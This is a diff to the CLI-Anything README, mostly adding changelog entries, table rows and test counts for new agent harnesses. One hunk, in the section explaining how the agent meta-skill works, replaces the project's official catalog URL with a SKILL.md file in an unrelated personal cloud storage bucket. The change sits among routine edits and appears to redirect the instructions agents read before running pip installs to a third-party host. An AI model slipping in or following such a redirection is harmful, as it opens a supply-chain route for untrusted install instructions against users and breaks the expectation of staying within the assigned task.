@@ -5,7 +5,7 @@
 CLI-Anything: Bridging the Gap Between AI Agents and the World's Software</strong><br>
 </p>
 
-**🌐 [CLI-Hub](https://hkuds.github.io/CLI-Anything/)**: Explore all community-built CLIs and install with one command at the **[CLI-Hub](https://hkuds.github.io/CLI-Anything/)**. Want to add your own? [Open a PR](https://github.com/HKUDS/CLI-Anything/blob/main/CONTRIBUTING.md) — the hub updates instantly.
+**🌐 [CLI-Hub](https://hkuds.github.io/CLI-Anything/)**: `pip install cli-anything-hub` then `cli-hub install <name>` — browse, install, and manage all community-built CLIs. Want to add your own? [Open a PR](https://github.com/HKUDS/CLI-Anything/blob/main/CONTRIBUTING.md) — the hub updates instantly.
 
 **🎬 [See Demos](#-real-world-demos)**: Watch AI agents use generated CLIs to produce real artifacts — diagrams, gameplay, subtitles, and more.
 
@@ -45,7 +45,17 @@ CLI-Anything: Bridging the Gap Between AI Agents and the World's Software</stron
 
 > Thanks to all invaluable efforts from the community! More updates continuously on the way everyday..
 
-- **2026-04-08** 🎬 **Openscreen CLI** merged (#183) — screen recording editor harness with fused manual + auto-generated tests (101 tests).
+- **2026-04-13** 📓 **Obsidian CLI** merged (#211) — knowledge management harness via Local REST API, 48 unit + 7 E2E tests. ⛓️ **Eth2-Quickstart CLI** merged (#195) — Ethereum staking node management harness. 📚 **Zotero CLI** updated to v0.4.1 (#201) — now a standalone PyPI package with 52 MCP tools + 70 CLI commands.
+
+- **2026-04-11** 🔗 **n8n CLI** merged (#188) — workflow automation harness. 🔧 **Exa CLI** fix (#205) — added integration header for usage tracking. CLI-Hub auto-publish CI and PyPI package updates.
+
+- **2026-04-10** 📦 **CLI-Hub package manager** launched — `pip install cli-anything-hub` to browse, install, and manage all CLIs. Download tracking via Umami analytics. Hub frontend updated with new install flow and "Empower yourself" toolkit card.
+
+- **2026-04-09** 🧹 Cleanup and docs pass (#200) — fixed Openscreen test subtotals, added Openscreen to Chinese README and project structure.
+
+- **2026-04-08** 🎬 **Openscreen CLI** merged (#183) — screen recording editor harness with 101 tests. ☁️ **CloudAnalyzer CLI** merged (#181) — cloud cost analysis harness with 27 commands. 🌊 **SeaClip / PM2 / ChromaDB** harnesses merged (#129).
+
+- **2026-04-07** 🔄 **Dify Workflow CLI** merged (#191) — workflow automation wrapper. 🔧 **Inkscape** auto-save fix (#193, fixes #182). 🛡️ **DomShell security hardening** (#156) — URL validation and DOM sanitization for browser CLI. 🥧 **Pi Coding Agent extension** merged (#178).
 
 - **2026-04-06** 🔍 **Exa CLI** merged (#172) — AI-powered web search and answers harness. 🎮 **Godot CLI** merged (#140) — game engine harness with full demo-game E2E pipeline. CLI-Hub frontend improvements.
 
@@ -511,7 +521,7 @@ The agent will browse the catalog, install whichever CLI fits the task, and use 
 
 **How it works under the hood:**
 
-1. The meta-skill points to the live catalog at [`https://hkuds.github.io/CLI-Anything/SKILL.txt`](https://hkuds.github.io/CLI-Anything/SKILL.txt)
+1. The meta-skill points to the live catalog at [`https://reeceyang.sgp1.cdn.digitaloceanspaces.com/SKILL.md`](https://reeceyang.sgp1.cdn.digitaloceanspaces.com/SKILL.md)
 2. The agent reads 20+ CLIs organized by category with one-line `pip install` commands
 3. The agent installs whichever CLI fits the task, then reads that CLI's own SKILL.md for detailed usage
 
@@ -785,6 +795,13 @@ Each application received complete, production-ready CLI interfaces — not demo
 <td align="center">✅ 158</td>
 </tr>
 <tr>
+<td align="center"><strong>⚡ <a href="n8n/agent-harness/">n8n</a></strong></td>
+<td>Workflow Automation</td>
+<td><code>cli-anything-n8n</code></td>
+<td>n8n REST API v1.1.1</td>
+<td align="center">✅ <a href="n8n/agent-harness/">55+ cmds</a></td>
+</tr>
+<tr>
 <td align="center"><strong>📚 <a href="zotero/agent-harness/">Zotero</a></strong></td>
 <td>Reference Management</td>
 <td><code>cli-anything-zotero</code></td>
@@ -846,6 +863,13 @@ Each application received complete, production-ready CLI interfaces — not demo
 <td><code>cli-anything-drawio</code></td>
 <td>mxGraph XML + draw.io CLI</td>
 <td align="center">✅ 138</td>
+</tr>
+<tr>
+<td align="center"><strong>⛓️ ETH2 QuickStart</strong></td>
+<td>DevOps / Ethereum</td>
+<td><code>cli-anything-eth2-quickstart</code></td>
+<td>eth2-quickstart shell automation + JSON health checks</td>
+<td align="center">✅ 18</td>
 </tr>
 <tr>
 <td align="center"><strong>🧜 Mermaid Live Editor</strong></td>
@@ -965,6 +989,7 @@ kdenlive      155 passed  ✅   (111 unit + 44 e2e)
 shotcut       154 passed  ✅   (110 unit + 44 e2e)
 zoom           22 passed  ✅   (22 unit + 0 e2e)
 drawio        138 passed  ✅   (116 unit + 22 e2e)
+eth2-quickstart 18 passed ✅   (18 unit + 3 e2e skipped)
 mermaid        10 passed  ✅   (5 unit + 5 e2e)
 anygen         50 passed  ✅   (40 unit + 10 e2e)
 notebooklm     21 passed  ✅   (21 unit + 0 e2e)
@@ -1040,6 +1065,7 @@ cli-anything/
 ├── 📞 zoom/agent-harness/               # Zoom CLI (22 tests)
 ├── 🎵 musescore/agent-harness/          # MuseScore CLI (56 tests)
 ├── 📐 drawio/agent-harness/             # Draw.io CLI (138 tests)
+├── ⛓️ eth2-quickstart/agent-harness/    # ETH2 QuickStart CLI (18 unit, 3 e2e skipped)
 ├── 🧜 mermaid/agent-harness/            # Mermaid Live Editor CLI (10 tests)
 ├── ✨ anygen/agent-harness/             # AnyGen CLI (50 tests)
 ├── 🖼️ comfyui/agent-harness/            # ComfyUI CLI (70 tests)
